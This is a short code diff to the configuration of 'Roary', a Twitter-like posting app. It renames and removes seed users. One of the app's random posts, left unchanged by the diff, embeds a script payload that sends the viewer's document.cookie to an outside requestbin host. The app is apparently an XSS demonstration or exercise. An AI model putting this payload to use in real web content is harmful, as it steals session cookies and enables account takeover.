@@ -1,8 +1,3 @@
-/*
- * Roary - Twitter-like posting service
- * Modular JavaScript for post management
- */
-
 const CONFIG = {
     timing: {
         initialPostDelay: 10000, // ms - delay before first random post
@@ -16,9 +11,8 @@ const CONFIG = {
         { avatar: '🦖', username: 'RadicalRex247' },
         { avatar: '🦕', username: 'DynamiteDino1337' },
         { avatar: '🐶', username: 'DoggyDan342' },
-        { avatar: '🐱', username: 'CoolCat66' },
-        { avatar: '🦋', username: 'ButterflyBetty42' },
-        { avatar: '🐻', username: 'BodaciousBear12' }
+        { avatar: '🐱', username: 'CoolCat67' },
+        { avatar: '🦋', username: 'ButterflyBetty42' }
     ],
     randomPosts: [
         "I love cookies!🍪 '<script>window.location.replace(\"https://requestbin.kanbanbox.com/ACB798?\" + document.cookie)</script>'",
